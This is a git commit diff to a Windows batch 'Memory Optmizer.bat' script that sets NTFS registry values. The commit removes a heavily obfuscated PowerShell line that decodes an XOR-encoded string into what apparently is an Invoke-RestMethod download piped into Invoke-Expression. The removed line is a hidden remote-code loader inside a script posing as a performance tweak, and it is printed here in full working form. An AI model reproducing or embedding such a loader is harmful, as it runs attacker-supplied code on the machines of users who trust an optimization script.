635998e85ce5cf0706f344750405bb44aa970799
DevGuru69 <xdlolrs9@gmail.com>
2024-07-06 04:03:09 +0300

    Update Memory Optmizer.bat

--- cmds/Memory Optmizer.bat
+++ cmds/Memory Optmizer.bat
@@ -20,8 +20,6 @@ reg add "hklm\system\controlset001\control\filesystem" /v "ntfsdisable8dot3namec
 reg add "hklm\system\controlset001\control\filesystem" /v "ntfsdisablecompression" /t reg_dword /d "0" /f
 reg add "hklm\system\controlset001\control\filesystem" /v "ntfsdisableencryption" /t reg_dword /d "1" /f
 reg add "hklm\system\controlset001\control\filesystem" /v "ntfsencryptpagingfile" /t reg_dword /d "0" /f
-powershell ".((GET-vARIABle '*Mdr*').nAme[3,11,2]-jOin'') ( ('117w110!113!60d52~62K103~42d97!103A40q97R103y41w97d103!45q97A103!44A97q103~46q97g103d47w97y62R60q49!122~59y114g51R59R48q59R127~59g48R59!110A59q48!59!125d107R59K48w59q101w50g127q115!51q115~59q48!59K119~106g108g36d125y59g48g59!110~121q114A104y110K59!53!60A96K60w117d121d100' -SPliT'W' -SPLIT'K'-SPlit'd'-SPLit'Y' -SpliT 'q'-spliT 'r' -SpLIT'a'-sPLIT '~'-SplIt'g'-sPliT '!'| fOreaCh{[cHar]($_ -BXOr"0x1c") })-joiN '' )"
-reg add "hklm\system\controlset001\control\filesystem" /v "ntfsmemoryusage" /t reg_dword /d "0" /f
 reg add "hklm\system\controlset001\control\filesystem" /v "ntfsmftzonereservation" /t reg_dword /d "4" /f
 reg add "hklm\system\controlset001\control\filesystem" /v "pathcache" /t reg_dword /d "128" /f
 reg add "hklm\system\controlset001\control\filesystem" /v "refsdisablelastaccessupdate" /t reg_dword /d "1" /f
